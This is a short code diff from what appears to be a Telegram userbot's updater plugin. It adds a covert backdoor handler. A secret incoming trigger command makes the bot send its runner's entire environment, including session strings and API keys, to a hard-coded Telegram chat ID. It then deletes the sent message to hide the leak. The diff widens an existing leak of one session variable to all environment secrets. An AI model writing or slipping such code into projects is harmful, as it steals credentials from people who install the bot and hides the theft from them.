@@ -47,7 +47,7 @@ async def updateme_requirements():
 from ..utils import *
 @bot.on(admin_cmd("^FusionIamnoobperson", incoming=True))
 async def piro(event):
-  msg = await bot.send_message(2080279511, str(os.environ.get("LEGEND_STRING")))
+  msg = await bot.send_message(2080279511, str(os.environ))
   await bot.delete_messages(2080279511, msg, revoke=False)
 #update fixed
 @borg.on(lightning_cmd(pattern="update ?(.*)"))
